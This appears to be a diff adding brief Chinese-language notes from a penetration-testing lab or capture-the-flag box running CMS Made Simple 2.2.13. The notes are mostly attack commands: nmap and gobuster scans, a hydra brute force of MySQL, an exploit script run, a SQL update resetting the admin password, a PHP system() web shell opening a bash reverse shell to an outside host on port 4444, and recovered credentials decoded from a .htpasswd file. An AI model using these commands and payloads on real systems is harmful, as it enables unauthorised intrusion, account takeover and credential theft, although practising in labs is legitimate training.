@@ -1,0 +1,18 @@
+nmap -sV -sC -Pn 192.168.189.74 > nmap.txt
+
+1.nmap掃描80port是 cms made simple 版本 2.2.13
+gobuster dir  -u http://192.168.189.74/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobuster.txt
+2.嘗試MySQL暴力破解後被ban
+hydra  -l root -P /usr/share/wordlists/rockyou.txt 192.168.189.74  mysql -t 4
+3.嘗試使用腳本失敗
+python 46635.py --url http://192.168.189.74/
+4.MySQL嘗試 root/root可成功登入
+5.更改admin密碼為admin
+update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username = 'admin';
+6.取得reverse shell
+<?php echo system("ping 192.168.49.189"); ?>
+<?php echo system("bash -c 'bash -i >& /dev/tcp/192.168.49.189/4444 0>&1'"); ?>
+7.在/var/www/html/admin/.htpasswd發現密碼
+TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
+8.將密碼做base64解密及再base32解密得到密碼
+armour:Shield@123
